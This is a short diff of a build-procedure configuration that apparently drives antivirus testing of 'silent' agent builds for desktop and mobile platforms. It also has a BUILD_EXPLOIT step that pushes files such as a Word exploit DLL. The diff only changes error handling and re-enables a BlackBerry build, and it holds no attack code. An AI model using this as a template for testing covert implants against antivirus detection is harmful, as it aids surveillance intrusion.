@@ -40,15 +40,19 @@ BUILD_DESKTOP:
     - PUSH: [ AVAgent/assets/avtest.swf ]
     - PUSH: [ AVAgent/assets/sqlite, AVAgent/assets/sqlite_mod, AVAgent/assets/codec, AVAgent/assets/codec_mod ]
     - CHECK_STATIC: [ AVAgent/assets/* ]
+    - ON_ERROR: CONTINUE
     - BUILD: [ pull, windows, silent ]
     - BUILD: [ pull, osx, silent ]
     - BUILD: [ pull, linux, silent ]
+    - ON_ERROR: SKIP
 
 BUILD_MOBILE:
     - CALL: SET_DEFAULTS
-   # - BUILD: [ pull, blackberry, silent ]
+    - ON_ERROR: CONTINUE
+    - BUILD: [ pull, blackberry, silent ]
     - BUILD: [ pull, android, silent ]
     - BUILD: [ pull, ios, silent ]
+    - ON_ERROR: SKIP
 
 BUILD_EXPLOIT:
     - PUSH: [ AVAgent/assets/avtest.swf, AVAgent/assets/melt*, AVAgent/assets/PMIEFuck-WinWord.dll ]
